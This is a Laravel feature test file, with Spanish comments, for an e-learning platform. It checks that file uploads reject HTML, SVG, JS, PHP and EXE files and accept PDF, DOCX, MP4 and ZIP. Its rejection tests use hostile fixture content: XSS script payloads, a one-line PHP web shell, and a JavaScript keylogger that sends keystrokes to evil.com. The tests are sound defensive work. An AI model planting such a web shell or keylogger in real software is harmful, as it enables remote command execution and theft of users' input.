<?php

namespace Tests\Feature\Uploads;

use App\Models\Course;
use App\Models\CourseModule;
use App\Models\ModuleSection;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * Verifica que los endpoints de subida de archivos rechazan extensiones
 * peligrosas (HTML, SVG, JS, PHP, etc.) y aceptan extensiones legítimas.
 *
 * Se testea a través de ModuleManagementController::storeItem que es el
 * endpoint activo de subida de contenido. AdminMaterialsController tiene
 * la misma restricción aplicada pero su endpoint depende de modelos legacy
 * (CourseUnit/UnitSession/Material) cuyas tablas fueron renombradas en
 * Sprint 11 — un bug pre-existente fuera del alcance de esta corrección.
 */
class UploadMimeRestrictionTest extends TestCase
{
    use RefreshDatabase;

    private function createSectionForAdmin(): array
    {
        $course = Course::factory()->create();
        $module = CourseModule::create(['course_id' => $course->id, 'title' => 'Módulo Test', 'order' => 1]);
        $section = ModuleSection::create(['course_module_id' => $module->id, 'title' => 'Sección Test', 'order' => 1]);
        $admin = User::factory()->create(['role' => 'admin', 'tenant_id' => $course->tenant_id]);

        return [$section, $admin];
    }

    // ─── REJECTION: Dangerous file types ───────────────────────────────���────

    public function test_rejects_html_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'Payload XSS',
                'file' => UploadedFile::fake()->createWithContent('malicious.html', '<script>alert("XSS")</script>'),
            ]
        );

        $response->assertStatus(422)
            ->assertJsonValidationErrors(['file']);
    }

    public function test_rejects_svg_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'SVG Malicioso',
                'file' => UploadedFile::fake()->createWithContent(
                    'evil.svg',
                    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>'
                ),
            ]
        );

        $response->assertStatus(422)
            ->assertJsonValidationErrors(['file']);
    }

    public function test_rejects_php_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'Web Shell',
                'file' => UploadedFile::fake()->createWithContent('shell.php', '<?php system($_GET["cmd"]); ?>'),
            ]
        );

        $response->assertStatus(422)
            ->assertJsonValidationErrors(['file']);
    }

    public function test_rejects_js_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'Keylogger',
                'file' => UploadedFile::fake()->createWithContent(
                    'keylogger.js',
                    'document.onkeypress=e=>fetch("//evil.com?k="+e.key)'
                ),
            ]
        );

        $response->assertStatus(422)
            ->assertJsonValidationErrors(['file']);
    }

    public function test_rejects_exe_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'Malware',
                'file' => UploadedFile::fake()->createWithContent('trojan.exe', str_repeat("\x00", 100)),
            ]
        );

        $response->assertStatus(422)
            ->assertJsonValidationErrors(['file']);
    }

    // ─── ACCEPTANCE: Legitimate file types ──────────────────────────────────

    public function test_accepts_pdf_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'Material PDF',
                'file' => UploadedFile::fake()->create('documento.pdf', 1024, 'application/pdf'),
            ]
        );

        $response->assertCreated()
            ->assertJsonPath('data.title', 'Material PDF');

        Storage::disk('public')->assertExists($response->json('data.path'));
    }

    public function test_accepts_docx_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'Trabajo Word',
                'file' => UploadedFile::fake()->create(
                    'tarea.docx',
                    512,
                    'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
                ),
            ]
        );

        $response->assertCreated();
    }

    public function test_accepts_mp4_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'Clase Grabada',
                'file' => UploadedFile::fake()->create('clase.mp4', 5120, 'video/mp4'),
            ]
        );

        $response->assertCreated();
    }

    public function test_accepts_zip_upload(): void
    {
        Storage::fake('public');
        [$section, $admin] = $this->createSectionForAdmin();

        $response = $this->actingAs($admin)->postJson(
            "/api/v1/aula/sections/{$section->id}/items",
            [
                'type' => 'file',
                'title' => 'Recursos Comprimidos',
                'file' => UploadedFile::fake()->create('recursos.zip', 2048, 'application/zip'),
            ]
        );

        $response->assertCreated();
    }

    // ─── CONFIG: Verify upload configuration is loaded ──────────────────────

    public function test_upload_config_has_content_item_extensions(): void
    {
        $extensions = config('uploads.content_item_extensions');

        $this->assertIsArray($extensions);
        $this->assertContains('pdf', $extensions);
        $this->assertContains('docx', $extensions);
        $this->assertContains('mp4', $extensions);
        $this->assertContains('zip', $extensions);

        // Must NOT contain dangerous extensions
        $this->assertNotContains('html', $extensions);
        $this->assertNotContains('svg', $extensions);
        $this->assertNotContains('js', $extensions);
        $this->assertNotContains('php', $extensions);
        $this->assertNotContains('exe', $extensions);
    }

    public function test_upload_config_has_material_extensions(): void
    {
        $extensions = config('uploads.material_extensions');

        $this->assertIsArray($extensions);
        $this->assertContains('pdf', $extensions);
        $this->assertContains('xlsx', $extensions);

        // Must NOT contain dangerous extensions
        $this->assertNotContains('html', $extensions);
        $this->assertNotContains('svg', $extensions);
        $this->assertNotContains('php', $extensions);
    }
}
